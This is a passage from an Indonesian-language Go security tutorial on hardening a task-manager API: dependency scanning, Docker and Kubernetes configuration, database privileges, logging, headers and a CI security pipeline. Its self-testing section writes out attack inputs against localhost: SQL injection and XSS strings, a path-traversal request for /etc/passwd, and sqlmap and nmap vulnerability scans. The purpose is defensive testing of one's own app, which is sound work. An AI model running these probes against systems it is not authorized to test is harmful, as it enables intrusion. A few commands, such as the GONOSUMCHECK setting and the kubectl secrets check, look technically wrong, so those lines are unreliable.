- API keys dan secrets
- Service URLs (database host, Redis host)
- Feature flags
- Log level

Config yang BOLEH di code:
- Port default (8080)
- Pagination default (limit 10)
- Timeout defaults
- Struct definitions
```

> **Review Task Manager kita:** `internal/config/config.go` sudah pakai environment variables dengan fallback. Tapi fallback JWT_SECRET-nya `"your-secret-key-change-in-production"` — ini harus di-validate di production supaya ga ada yang lupa ganti!

---

## 20.13 Dependency Security — Supply Chain Safety

### Go Module Security

```bash
# 1. Check for vulnerabilities
go install golang.org/x/vuln/cmd/govulncheck@latest
govulncheck ./...

# Output:
# === Symbol Results ===
# Vulnerability #1: GO-2024-2887
#   A malicious HTTP/2 client can cause...
#   Found in: golang.org/x/net@v0.17.0
#   Fixed in: golang.org/x/net@v0.23.0
#
#   stdlib is affected.

# 2. Verify module checksums
go mod verify
# all modules verified

# 3. Update semua dependency
go get -u ./...
go mod tidy

# 4. Check for unused dependencies
go mod tidy -v
# Output shows removed modules
```

### Minimal Dependencies

```go
// BAD: terlalu banyak dependencies untuk hal simple
import (
    "github.com/some-lib/uuid-generator"    // Cukup pakai google/uuid
    "github.com/another-lib/string-utils"    // Cukup pakai stdlib strings
    "github.com/yet-another/http-client"     // Cukup pakai net/http
    "github.com/fancy-logger/v3"              // Cukup pakai log/slog (Go 1.21+)
)

// GOOD: gunakan stdlib sebanyak mungkin
import (
    "crypto/rand"      // Bukan third-party random
    "encoding/json"    // Bukan third-party JSON
    "log/slog"         // Bukan third-party logger (Go 1.21+)
    "net/http"         // Bukan third-party HTTP client
    "strings"          // Bukan third-party string utils
)

// Hanya pakai third-party untuk hal yang genuinely complex:
import (
    "github.com/gin-gonic/gin"              // HTTP framework — worth it
    "gorm.io/gorm"                           // ORM — worth it
    "github.com/golang-jwt/jwt/v5"          // JWT — crypto, jangan DIY
    "golang.org/x/crypto/bcrypt"            // Crypto — jangan DIY
    "github.com/redis/go-redis/v9"          // Redis client — worth it
)
```

### GitHub Dependabot

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "gomod"
    directory: "/"
    schedule:
      interval: "weekly"
    reviewers:
      - "irzan-aldi"
    labels:
      - "dependencies"
      - "security"
    # Auto-approve minor/patch updates
    open-pull-requests-limit: 10

  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"

  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Supply Chain Attacks — Real Threat

```
Supply chain attack = attacker compromise dependency yang kamu pakai

Real examples:
1. event-stream (npm, 2018) — maintainer inject crypto miner
2. ua-parser-js (npm, 2021) — hijacked, inject password stealer
3. colors.js (npm, 2022) — maintainer sabotage own library

Go-specific protections:
- go.sum = checksum database (GONOSUMCHECK=off)
- Go module proxy (proxy.golang.org) — cache modules
- sumdb (sum.golang.org) — verify integrity
- Module signing verification
```

```bash
# Verify Go module checksums against sumdb
GONOSUMCHECK=off go mod verify

# Check if your modules are in sumdb
go mod download -x

# Lock module versions
# go.mod + go.sum = your lockfile
# SELALU commit go.sum ke git!
```

---

## 20.14 Docker Security — Container Hardening

### Review Task Manager Dockerfile

```dockerfile
# VULNERABLE Dockerfile — common mistakes
FROM golang:1.22

WORKDIR /app
COPY . .
RUN go build -o main ./cmd/api

# Running as ROOT! ❌
# Full OS with unnecessary tools ❌
# Source code ada di image ❌
# No health check ❌

EXPOSE 8080
CMD ["./main"]
```

### Production-Ready Secure Dockerfile

```dockerfile
# ===== Stage 1: Build =====
FROM golang:1.22-alpine AS builder

# Security: install CA certs dan create non-root user di build stage
RUN apk add --no-cache ca-certificates tzdata && \
    adduser -D -g '' appuser

WORKDIR /build

# Cache dependencies
COPY go.mod go.sum ./
RUN go mod download && go mod verify

# Build binary
COPY . .
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
    go build -ldflags="-w -s" -o /app/main ./cmd/api

# ===== Stage 2: Runtime =====
FROM scratch
# Atau: FROM gcr.io/distroless/static-debian12

# Copy CA certs dan timezone data
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo

# Copy user info
COPY --from=builder /etc/passwd /etc/passwd
COPY --from=builder /etc/group /etc/group

# Copy binary
COPY --from=builder /app/main /app/main

# Run as non-root user
USER appuser

# Read-only filesystem (binary only, no write access)
# Set via docker run --read-only or in compose

EXPOSE 8080

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD ["/app/main", "healthcheck"] || exit 1

ENTRYPOINT ["/app/main"]
```

### Docker Security Checklist

```yaml
# docker-compose.yml — production security
services:
  api:
    image: task-manager:1.0.0  # Pin version, jangan :latest
    user: "1000:1000"          # Non-root user
    read_only: true            # Read-only filesystem
    tmpfs:
      - /tmp                   # Writeable temp dir only
    security_opt:
      - no-new-privileges:true # Prevent privilege escalation
    cap_drop:
      - ALL                    # Drop all Linux capabilities
    deploy:
      resources:
        limits:
          cpus: '1.0'         # CPU limit
          memory: 512M         # Memory limit
        reservations:
          cpus: '0.5'
          memory: 256M
    environment:
      - APP_ENV=production
    # Secrets via Docker secrets, bukan env vars
    secrets:
      - jwt_secret
      - db_password
    networks:
      - internal              # Internal network only

  db:
    image: postgres:16-alpine
    user: "999:999"
    read_only: true
    tmpfs:
      - /tmp
      - /run/postgresql
    volumes:
      - db_data:/var/lib/postgresql/data  # Persistent data
    networks:
      - internal              # Ga bisa diakses dari luar!
    # NO ports exposed to host!
```

### Image Scanning dengan Trivy

```bash
# Install Trivy
brew install aquasecurity/trivy/trivy

# Scan Docker image
trivy image task-manager:latest

# Output:
# task-manager:latest (alpine 3.19.1)
# Total: 0 (UNKNOWN: 0, LOW: 0, MEDIUM: 0, HIGH: 0, CRITICAL: 0)
#
# Kalau pakai scratch/distroless = hampir pasti 0 vulnerabilities!

# Scan dengan severity filter
trivy image --severity HIGH,CRITICAL task-manager:latest

# Scan filesystem (sebelum build)
trivy fs --security-checks vuln,config .

# CI/CD integration
trivy image --exit-code 1 --severity CRITICAL task-manager:latest
# Exit code 1 = fail the pipeline if CRITICAL vulnerabilities found
```

### Comparison: Base Images

```
Image                    | Size      | Vulnerabilities | Shell? | Debugging?
─────────────────────────|───────────|─────────────────|────────|───────────
golang:1.22              | ~800MB    | Banyak          | Yes    | Easy
golang:1.22-alpine       | ~250MB    | Sedikit         | Yes    | Easy
alpine:3.19              | ~7MB      | Minimal         | Yes    | Limited
gcr.io/distroless/static | ~2MB      | Hampir 0        | No     | Susah
scratch                  | 0MB       | 0               | No     | Sangat susah

Rekomendasi:
- Development: golang:1.22-alpine (buat build dan debug)
- Production: scratch atau distroless (minimal attack surface)
- Distroless = no shell, no package manager, no OS utils
  → Attacker yang masuk ga bisa ngapa-ngapain
```

---

## 20.15 Kubernetes Security — Cluster Hardening

### RBAC — Role-Based Access Control di K8s

```yaml
# Beda dari RBAC di aplikasi kita!
# K8s RBAC = siapa boleh ngapain di CLUSTER

# Role: define permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: production
  name: task-manager-deployer
rules:
  - apiGroups: ["apps"]
    resources: ["deployments"]
    verbs: ["get", "list", "update", "patch"]   # Bisa deploy, tapi ga bisa delete
  - apiGroups: [""]
    resources: ["pods", "pods/log"]
    verbs: ["get", "list", "watch"]              # Bisa lihat pods dan logs
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: []                                     # TIDAK bisa akses secrets!

---
# RoleBinding: assign role ke user/service account
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: production
  name: deploy-binding
subjects:
  - kind: ServiceAccount
    name: github-actions-deployer
    namespace: production
roleRef:
  kind: Role
  name: task-manager-deployer
  apiGroup: rbac.authorization.k8s.io
```

### PodSecurityStandards

```yaml
# SecurityContext di Pod/Container level
apiVersion: apps/v1
kind: Deployment
metadata:
  name: task-manager
spec:
  template:
    spec:
      securityContext:
        runAsNonRoot: true           # WAJIB: jangan run as root
        runAsUser: 1000              # UID non-root
        runAsGroup: 1000
        fsGroup: 1000
        seccompProfile:
          type: RuntimeDefault       # Restrict system calls

      containers:
        - name: api
          image: task-manager:1.0.0
          securityContext:
            allowPrivilegeEscalation: false   # Cegah privilege escalation
            readOnlyRootFilesystem: true       # Filesystem read-only
            capabilities:
              drop:
                - ALL                          # Drop semua capabilities

          resources:
            limits:
              cpu: "1"
              memory: "512Mi"
            requests:
              cpu: "250m"
              memory: "128Mi"

          volumeMounts:
            - name: tmp
              mountPath: /tmp

      volumes:
        - name: tmp
          emptyDir:
            sizeLimit: 100Mi         # Limit tmp size

      # Automount service account token HANYA kalau perlu
      automountServiceAccountToken: false
```

### NetworkPolicy — Microsegmentation

```yaml
# Default deny all — then whitelist
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}          # Apply ke semua pods
  policyTypes:
    - Ingress
    - Egress

---
# Allow API to receive traffic from Nginx ingress only
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-ingress
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: task-manager
  policyTypes:
    - Ingress
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              name: ingress-nginx   # Hanya dari ingress namespace
      ports:
        - protocol: TCP
          port: 8080

---
# Allow API to connect to database and Redis only
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-egress
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: task-manager
  policyTypes:
    - Egress
  egress:
    - to:
        - podSelector:
            matchLabels:
              app: postgresql       # Cuma bisa ke PostgreSQL
      ports:
        - protocol: TCP
          port: 5432
    - to:
        - podSelector:
            matchLabels:
              app: redis            # Cuma bisa ke Redis
      ports:
        - protocol: TCP
          port: 6379
    - to:                           # DNS resolution
        - namespaceSelector: {}
      ports:
        - protocol: UDP
          port: 53
```

### Secrets Encryption at Rest

```yaml
# /etc/kubernetes/encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded-key>
      - identity: {} # Fallback: unencrypted (for reading old secrets)
```

```bash
# Verify secrets are encrypted
kubectl get secrets -n production -o json | \
  kubectl get --raw /api/v1/namespaces/production/secrets/task-manager-secrets | \
  python3 -m json.tool
```

---

## 20.16 API Security — Protecting Your Endpoints

### API Key vs OAuth2

```
API Key:
- Simple string ("sk_live_abc123")
- Per application/client
- Cocok untuk: server-to-server, third-party integrations
- Rate limit per API key
- Revocable

OAuth2:
- Token-based authorization framework
- Per user, with scopes
- Cocok untuk: user authorization, third-party access ke user data
- Access token + refresh token
- Scope-based permissions (read:tasks, write:tasks)

Task Manager kita: JWT (yang mirip OAuth2 simplified)
```

### Request Size Limit

```go
// Cegah attacker kirim request body 10GB
func RequestSizeLimiter(maxSize int64) gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxSize)
        c.Next()
    }
}

// Usage: max 1MB request body
r.Use(RequestSizeLimiter(1 << 20)) // 1 * 1024 * 1024 = 1MB

// Di Nginx juga:
// client_max_body_size 1m;
```

### Request Timeout

```go
import "context"

// Timeout middleware
func TimeoutMiddleware(timeout time.Duration) gin.HandlerFunc {
    return func(c *gin.Context) {
        ctx, cancel := context.WithTimeout(c.Request.Context(), timeout)
        defer cancel()

        c.Request = c.Request.WithContext(ctx)

        // Channel untuk detect finish
        finished := make(chan struct{})

        go func() {
            c.Next()
            close(finished)
        }()

        select {
        case <-finished:
            // Request completed normally
        case <-ctx.Done():
            c.Abort()
            response.Error(c, http.StatusGatewayTimeout, "Request timeout")
        }
    }
}

// Usage: 30 second timeout
r.Use(TimeoutMiddleware(30 * time.Second))
```

### Pagination Limit (Sudah Ada!)

```go
// Task Manager kita sudah protect pagination:
func (h *TaskHandler) GetByBoardID(c *gin.Context) {
    page, _ := strconv.Atoi(c.DefaultQuery("page", "1"))
    limit, _ := strconv.Atoi(c.DefaultQuery("limit", "10"))

    if page < 1 {
        page = 1
    }
    if limit < 1 || limit > 100 {
        limit = 10  // Max 100 items per page
    }
    // ...
}

// TANPA limit ini, attacker bisa request:
// GET /api/v1/boards/1/tasks?limit=999999999
// → Server coba load 999 juta rows → OOM!
```

### Field-Level Authorization

```go
// Beberapa field hanya boleh di-set oleh tertentu role

func (h *UserHandler) Update(c *gin.Context) {
    userID := c.GetUint("userID")
    userRole, _ := c.Get("role")

    var req struct {
        Name  *string     `json:"name"`
        Email *string     `json:"email"`
        Role  *model.Role `json:"role"`      // Hanya admin boleh set ini!
    }
    c.ShouldBindJSON(&req)

    // Field-level auth check
    if req.Role != nil && userRole.(model.Role) != model.RoleAdmin {
        response.Error(c, http.StatusForbidden, "Only admin can change roles")
        return
    }

    // Proceed with update...
}
```

---

## 20.17 Database Security — Protect Your Data

### Least Privilege Database User

```sql
-- JANGAN pakai superuser/postgres untuk aplikasi!

-- Create application-specific user
CREATE USER task_manager_app WITH PASSWORD 'strong_password_here';

-- Grant HANYA yang diperlukan
GRANT CONNECT ON DATABASE task_manager TO task_manager_app;
GRANT USAGE ON SCHEMA public TO task_manager_app;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO task_manager_app;
GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO task_manager_app;

-- Set default privileges untuk tabel baru
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO task_manager_app;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT USAGE ON SEQUENCES TO task_manager_app;

-- JANGAN kasih ini:
-- GRANT ALL PRIVILEGES ...  ← terlalu broad
-- GRANT CREATE ...           ← app ga perlu create tables (migration terpisah)
-- GRANT DROP ...             ← NEVER dari application user

-- Separate user untuk migration
CREATE USER task_manager_migrator WITH PASSWORD 'different_password';
GRANT ALL PRIVILEGES ON DATABASE task_manager TO task_manager_migrator;
-- Ini cuma dipakai saat migration, bukan runtime
```

### Encrypted Connections (SSL)

```go
// Connect ke PostgreSQL pakai SSL
import "gorm.io/driver/postgres"

dsn := fmt.Sprintf(
    "host=%s port=%s user=%s password=%s dbname=%s sslmode=require sslrootcert=%s",
    cfg.DB.Host,
    cfg.DB.Port,
    cfg.DB.User,
    cfg.DB.Password,
    cfg.DB.Name,
    "/etc/ssl/certs/rds-ca-2019-root.pem", // AWS RDS CA cert
)

db, err := gorm.Open(postgres.Open(dsn), &gorm.Config{})
```

### pg_hba.conf — Access Control

```
# /etc/postgresql/16/main/pg_hba.conf

# TYPE  DATABASE        USER                ADDRESS         METHOD

# Local connections
local   all             postgres                            peer
local   task_manager    task_manager_app                    scram-sha-256

# Remote connections — HANYA dari app server
hostssl task_manager    task_manager_app    10.0.1.0/24     scram-sha-256

# Block everything else
host    all             all                 0.0.0.0/0       reject
```

### Database Audit Logging

```sql
-- Enable audit logging di PostgreSQL
-- Install pgaudit extension
CREATE EXTENSION pgaudit;

-- Log semua DDL dan sensitive operations
ALTER SYSTEM SET pgaudit.log = 'ddl, role, write';
ALTER SYSTEM SET pgaudit.log_catalog = off;

-- Reload config
SELECT pg_reload_conf();

-- Output di PostgreSQL log:
-- AUDIT: SESSION,1,1,DDL,CREATE TABLE,,,"CREATE TABLE secrets (...)",<not logged>
-- AUDIT: SESSION,2,1,WRITE,INSERT,,,"INSERT INTO users (email, password) VALUES ...",<not logged>
```

### Backup Encryption

```bash
# Encrypted backup
pg_dump -h localhost -U postgres task_manager | \
  gpg --symmetric --cipher-algo AES256 -o backup_$(date +%Y%m%d).sql.gpg

# Restore encrypted backup
gpg --decrypt backup_20260501.sql.gpg | \
  psql -h localhost -U postgres task_manager

# AWS RDS — encryption at rest sudah built-in
# Tinggal enable saat create RDS instance
```

---

## 20.18 Logging for Security — Know When You're Under Attack

### What to Log

```go
// Security Event Logger
type SecurityLogger struct {
    logger *slog.Logger
}

func NewSecurityLogger() *SecurityLogger {
    handler := slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
        Level: slog.LevelInfo,
    })
    return &SecurityLogger{
        logger: slog.New(handler),
    }
}

// Authentication events
func (sl *SecurityLogger) LoginSuccess(email, ip, userAgent string) {
    sl.logger.Info("authentication",
        "event", "login_success",
        "email", email,
        "ip", ip,
        "user_agent", userAgent,
        "timestamp", time.Now().UTC(),
    )
}

func (sl *SecurityLogger) LoginFailed(email, ip, userAgent, reason string) {
    sl.logger.Warn("authentication",
        "event", "login_failed",
        "email", email,
        "ip", ip,
        "user_agent", userAgent,
        "reason", reason,
        "timestamp", time.Now().UTC(),
    )
}

// Authorization events
func (sl *SecurityLogger) AccessDenied(userID uint, resource, action, ip string) {
    sl.logger.Warn("authorization",
        "event", "access_denied",
        "user_id", userID,
        "resource", resource,
        "action", action,
        "ip", ip,
        "timestamp", time.Now().UTC(),
    )
}

// Admin actions
func (sl *SecurityLogger) AdminAction(adminID uint, action, target string, details map[string]interface{}) {
    sl.logger.Info("admin_action",
        "event", "admin_action",
        "admin_id", adminID,
        "action", action,
        "target", target,
        "details", details,
        "timestamp", time.Now().UTC(),
    )
}

// Rate limit events
func (sl *SecurityLogger) RateLimitExceeded(ip, endpoint string, count int64) {
    sl.logger.Warn("rate_limit",
        "event", "rate_limit_exceeded",
        "ip", ip,
        "endpoint", endpoint,
        "request_count", count,
        "timestamp", time.Now().UTC(),
    )
}
```

### What NOT to Log

```go
// JANGAN LOG INI:
sl.logger.Info("login",
    "email", req.Email,
    "password", req.Password,          // JANGAN! Password plain text
    "token", tokens.AccessToken,       // JANGAN! Token bisa dipakai
    "credit_card", user.CreditCard,    // JANGAN! PCI DSS violation
    "ssn", user.SSN,                   // JANGAN! PII
)

// YANG BENAR:
sl.logger.Info("login",
    "email", req.Email,                // OK — identifier
    "ip", c.ClientIP(),                // OK — forensics
    "user_agent", c.GetHeader("User-Agent"), // OK — forensics
    "result", "success",               // OK — event status
)
```

### Alerting pada Suspicious Activity

```yaml
# Grafana alert rules
# Alert kalau ada banyak failed login dari satu IP

# Prometheus query:
# sum(rate(login_failed_total{status="failed"}[5m])) by (ip) > 10

# Loki log query:
# {app="task-manager"} |= "login_failed" | json | count_over_time[5m] > 10

# Alert channels:
# - Slack #security-alerts
# - PagerDuty (untuk critical)
# - Email (untuk weekly digest)
```

### Suspicious Patterns to Monitor

```
1. Banyak failed login dari 1 IP → Brute force attack
2. Login dari lokasi/device baru → Account takeover attempt
3. Banyak 403 errors dari 1 user → Privilege escalation attempt
4. Sequential ID access (1, 2, 3, 4...) → IDOR scanning
5. Unusual API patterns (banyak request ke sensitive endpoints) → Recon
6. Login sukses setelah banyak gagal → Possible compromised account
7. Admin action di jam non-business → Suspicious admin activity
8. Spike di 400/422 errors → Input fuzzing / scanning
```

---

## 20.19 Security Headers — Defense in Depth

### Full Security Headers Middleware

```go
func SecurityHeadersMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // 1. X-Content-Type-Options
        // Prevent MIME type sniffing
        c.Header("X-Content-Type-Options", "nosniff")

        // 2. X-Frame-Options
        // Prevent clickjacking — halaman kita ga bisa di-embed di iframe
        c.Header("X-Frame-Options", "DENY")

        // 3. Strict-Transport-Security (HSTS)
        // Force HTTPS untuk 1 tahun, termasuk subdomain
        c.Header("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload")

        // 4. Content-Security-Policy
        // Control resource loading — untuk API cukup simple
        c.Header("Content-Security-Policy", "default-src 'none'; frame-ancestors 'none'")

        // 5. Referrer-Policy
        // Control info yang dikirim di Referer header
        c.Header("Referrer-Policy", "strict-origin-when-cross-origin")

        // 6. Permissions-Policy (sebelumnya Feature-Policy)
        // Disable browser features yang ga dipakai
        c.Header("Permissions-Policy", "camera=(), microphone=(), geolocation=(), payment=()")

        // 7. X-XSS-Protection
        // Legacy header (modern browsers punya built-in protection)
        c.Header("X-XSS-Protection", "1; mode=block")

        // 8. Cache-Control untuk sensitive data
        // Jangan cache response yang mengandung data sensitif
        c.Header("Cache-Control", "no-store, no-cache, must-revalidate, private")
        c.Header("Pragma", "no-cache")

        c.Next()
    }
}

// Register di router
func Setup(r *gin.Engine, ...) {
    r.Use(SecurityHeadersMiddleware())
    // ... rest of routes
}
```

### Nginx Security Headers

```nginx
server {
    # Security Headers
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # Hide server version
    server_tokens off;

    # Hide upstream proxy headers
    proxy_hide_header X-Powered-By;
    proxy_hide_header Server;

    location /api/ {
        proxy_pass http://backend;

        # Add CORS headers via Nginx (alternative to Go middleware)
        add_header Access-Control-Allow-Origin "https://app.taskmanager.com" always;
    }
}
```

### Test Security Headers

```bash
# Check headers pakai curl
curl -I https://api.taskmanager.com/health

# HTTP/2 200
# x-content-type-options: nosniff
# x-frame-options: DENY
# strict-transport-security: max-age=31536000; includeSubDomains; preload
# content-security-policy: default-src 'none'; frame-ancestors 'none'
# referrer-policy: strict-origin-when-cross-origin
# permissions-policy: camera=(), microphone=(), geolocation=(), payment=()

# Online tools:
# https://securityheaders.com — grade A/A+
# https://observatory.mozilla.org — comprehensive scan
```

---

## 20.20 Penetration Testing Basics — Hack Yourself Before Others Do

### Tools untuk Test API Kamu Sendiri

#### OWASP ZAP (Zed Attack Proxy)

```bash
# Install
brew install --cask owasp-zap

# Automated scan via CLI
zap-cli quick-scan --self-contained \
  --start-options '-config api.key=your-api-key' \
  http://localhost:8080/api/v1/

# Docker-based scan
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py \
  -t http://host.docker.internal:8080/api/v1/ \
  -f openapi \
  -r report.html
```

#### SQLMap

```bash
# Test for SQL injection
sqlmap -u "http://localhost:8080/api/v1/tasks?search=test" \
  --headers="Authorization: Bearer <token>" \
  --level=3 \
  --risk=2 \
  --batch \
  --random-agent

# Test specific parameter
sqlmap -u "http://localhost:8080/api/v1/tasks/1" \
  --headers="Authorization: Bearer <token>" \
  --method=GET \
  --batch
```

#### Nmap

```bash
# Scan open ports
nmap -sV -p 1-65535 your-server.com

# Quick security scan
nmap -sV --script=vuln your-server.com

# Check TLS
nmap --script ssl-enum-ciphers -p 443 your-server.com
```

#### Burp Suite

```
Burp Suite (Community Edition — free):
1. Proxy browser traffic through Burp
2. Intercept dan modify requests
3. Replay requests dengan modified parameters
4. Test IDOR: ganti user ID di request
5. Test injection: inject payloads di parameter
6. Test auth bypass: remove/modify JWT token
```

### Manual Testing Checklist

```bash
# 1. Test broken access control (IDOR)
# Login as User A, try to access User B's resources
curl -H "Authorization: Bearer <user_a_token>" \
  http://localhost:8080/api/v1/boards/999  # Board milik User B

# 2. Test without authentication
curl http://localhost:8080/api/v1/users/profile
# Should return 401

# 3. Test with expired token
curl -H "Authorization: Bearer <expired_token>" \
  http://localhost:8080/api/v1/boards
# Should return 401

# 4. Test with modified token (tampered)
curl -H "Authorization: Bearer <modified_token>" \
  http://localhost:8080/api/v1/boards
# Should return 401

# 5. Test SQL injection
curl -H "Authorization: Bearer <token>" \
  "http://localhost:8080/api/v1/tasks?search=' OR 1=1 --"
# Should return normal response (no extra data)

# 6. Test XSS in input
curl -X POST -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"title":"<script>alert(1)</script>"}' \
  http://localhost:8080/api/v1/boards
# Should be sanitized or rejected

# 7. Test rate limiting
for i in {1..200}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    http://localhost:8080/api/v1/auth/login \
    -X POST -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}'
done
# Should get 429 after hitting limit

# 8. Test large payload
python3 -c "print('{\"title\":\"' + 'A'*1000000 + '\"}')" | \
  curl -X POST -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d @- http://localhost:8080/api/v1/boards
# Should be rejected (request too large)

# 9. Test admin endpoints as member
curl -H "Authorization: Bearer <member_token>" \
  http://localhost:8080/api/v1/users
# Should return 403

# 10. Test path traversal
curl http://localhost:8080/../../etc/passwd
# Should return 404 or 400
```

### Bug Bounty Concept

```
Bug Bounty = program dimana kamu BAYAR hacker untuk nemuin bug di app kamu.

Platforms:
- HackerOne — platform terbesar
- Bugcrowd — platform alternatif
- Open Bug Bounty — untuk small projects

Reward tiers:
- Critical (RCE, data breach): $10,000 - $100,000+
- High (SQL injection, auth bypass): $1,000 - $10,000
- Medium (XSS, CSRF): $500 - $2,000
- Low (info disclosure, missing headers): $100 - $500

Kapan mulai bug bounty:
- Setelah kamu udah tes sendiri
- Setelah automated scanning bersih
- Setelah peer review
- Bug bounty = last line of defense
```

---

## 20.21 Security in CI/CD — Automate Security Testing

### Full Security Pipeline

```yaml
# .github/workflows/security.yml
name: Security Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Weekly scan setiap Senin jam 6 UTC

jobs:
  # ===== SAST: Static Application Security Testing =====
  sast:
    name: SAST (Static Analysis)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      # gosec — Go security checker
      - name: Run gosec
        uses: securego/gosec@master
        with:
          args: '-no-fail -fmt sarif -out gosec-results.sarif ./...'

      - name: Upload SARIF
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: gosec-results.sarif

      # staticcheck — comprehensive linter
      - name: Run staticcheck
        uses: dominikh/staticcheck-action@v1
        with:
          version: "latest"

  # ===== SCA: Software Composition Analysis =====
  sca:
    name: SCA (Dependency Scan)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      # govulncheck — official Go vulnerability checker
      - name: Run govulncheck
        run: |
          go install golang.org/x/vuln/cmd/govulncheck@latest
          govulncheck ./...

      # Snyk (optional — more comprehensive)
      - name: Run Snyk
        uses: snyk/actions/golang@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

  # ===== Secret Scanning =====
  secrets:
    name: Secret Scanning
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history untuk scan semua commits

      # gitleaks — detect secrets in code
      - name: Run gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # trufflehog — deep secret scanning
      - name: Run TruffleHog
        uses: trufflesecurity/trufflehog@main
        with:
          extra_args: --only-verified

  # ===== Container Scanning =====
  container:
    name: Container Scan
    runs-on: ubuntu-latest
    needs: [sast, sca]
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t task-manager:${{ github.sha }} .

      # Trivy — container vulnerability scanner
      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'task-manager:${{ github.sha }}'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'  # Fail on critical/high

      - name: Upload Trivy SARIF
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: trivy-results.sarif

  # ===== DAST: Dynamic Application Security Testing =====
  dast:
    name: DAST (Dynamic Scan)
    runs-on: ubuntu-latest
    needs: [container]
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_DB: task_manager_test
          POSTGRES_PASSWORD: testpassword
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      redis:
        image: redis:7-alpine
    steps:
      - uses: actions/checkout@v4

      - name: Start application
        run: |
          docker run -d --name app \
            --network ${{ job.container.network }} \
            -e APP_ENV=test \
            -e DB_HOST=postgres \
            -e REDIS_HOST=redis \
            -e JWT_SECRET=test-secret-key-for-ci-cd-only \
            -p 8080:8080 \
            task-manager:${{ github.sha }}
          sleep 5

      # OWASP ZAP API scan
      - name: ZAP API Scan
        uses: zaproxy/action-api-scan@v0.7.0
        with:
          target: 'http://localhost:8080/api/v1/'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'
```

### gosec — Go Security Checker

```bash
# Install
go install github.com/securego/gosec/v2/cmd/gosec@latest

# Scan project
gosec ./...

# Output contoh:
# [gosec] Results:
#
# [G101] Potential hardcoded credentials
#    > internal/config/config.go:31
#    > JWTSecret: getEnv("JWT_SECRET", "your-secret-key-change-in-production")
#
# [G104] Errors unhandled
#    > internal/middleware/ratelimit.go:28
#    > redisClient.Expire(ctx, key, window)

# Exclude specific rules
gosec -exclude=G104 ./...

# Generate SARIF report
gosec -fmt=sarif -out=results.sarif ./...
```

### gitleaks — Secret Scanner

```bash
# Install
brew install gitleaks

# Scan current state
gitleaks detect --source . --verbose

# Scan git history (find secrets in old commits)
gitleaks detect --source . --verbose --log-opts="--all"

# Pre-commit hook
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
```

```
# .gitleaks.toml — custom rules
[extend]
useDefault = true

[[rules]]
id = "task-manager-api-key"
description = "Task Manager API Key"
regex = '''(?i)task[-_]?manager[-_]?api[-_]?key\s*[=:]\s*['"]?([a-zA-Z0-9]{32,})'''
```

---

